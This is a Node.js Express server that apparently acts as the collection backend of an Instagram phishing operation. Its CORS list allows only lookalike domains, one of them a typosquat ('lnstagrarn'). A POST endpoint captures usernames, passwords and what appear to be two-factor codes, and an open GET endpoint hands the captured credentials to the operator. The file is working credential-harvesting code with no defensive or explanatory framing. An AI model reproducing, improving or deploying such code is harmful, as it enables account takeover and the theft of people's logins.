const express = require("express");
const cors = require("cors");

const app = express();

app.use(cors({
    origin: [
        "https://account-instagram-com.vercel.app",
        "https://lnstagrarn-reel-paoa2oajo.vercel.app"
    ]
}));

app.use(express.json());

app.get("/health", (req, res) => {
    res.json({
        status: "ok",
        message: "Server is running"
    });
});

// One login cycle at a time
let currentLogin = null;

app.post("/data", (req, res) => {
    const { username, password, code } = req.body;

    // New username = new login cycle
    if (username && username !== currentLogin?.username) {
        currentLogin = {
            username,
            password: password ?? null,
            code: null
        };

        console.log("New login cycle:", {
            username
        });
    }

    // Attach a code to the current cycle
    if (code && currentLogin) {
        currentLogin.code = code;

        console.log("Code received for current cycle");
    }

    res.json({
        success: true
    });
});

app.get("/data", (req, res) => {
    res.json(currentLogin ? [currentLogin] : []);
});

const PORT = process.env.PORT || 1000;

app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
});
